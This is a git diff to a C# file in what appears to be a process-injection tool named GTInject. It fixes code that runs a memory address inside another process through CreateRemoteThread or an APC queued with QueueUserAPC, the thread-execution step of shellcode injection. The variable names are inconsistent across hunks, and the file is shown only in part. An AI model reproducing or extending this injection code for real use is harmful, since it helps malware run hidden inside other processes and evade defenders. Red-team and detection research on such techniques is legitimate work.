@@ -1,15 +1,12 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Runtime.InteropServices;
 using System.Diagnostics;
 
 namespace GTInject.Injection
 {
     internal class threadexec
     {
-        public static IntPtr SelectThreadOption(IntPtr memaddr, int execoption, int pid, int tid)
+        public static IntPtr SelectThreadOption(IntPtr memaddr, int execoption, Process pid, int tid)
         {
             switch (execoption)
             {
@@ -33,7 +30,7 @@ namespace GTInject.Injection
             // OPTION 1 == CreateRemoteThread (WINAPI)
             /////////////////////////////////////
             
-            IntPtr remoteThreadResp = CreateRemoteThread(ProcID.handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
+            IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
             return remoteThreadResp;
         }
 
@@ -43,8 +40,8 @@ namespace GTInject.Injection
             // OPTION 2 == QueueUserAPC & ResumeThread
             /////////////////////////////////////
             
-            var threadHandle = OpenThread(QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
-            IntPtr QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero)
+            var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+            var QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero);
 
             // Test this, recall not needing any additional actions if submitting a thread in the wait states already
             //var ResThreadResp = ResumeThread(threadHandle);
@@ -76,7 +73,7 @@ namespace GTInject.Injection
         public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr OpenThread(uint desiredAccess, bool inheritHandle, uint threadId);
+        static extern IntPtr OpenThread(ThreadAccess desiredAccess, bool inheritHandle, uint threadId);
 
         [DllImport("kernel32.dll")]
         public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
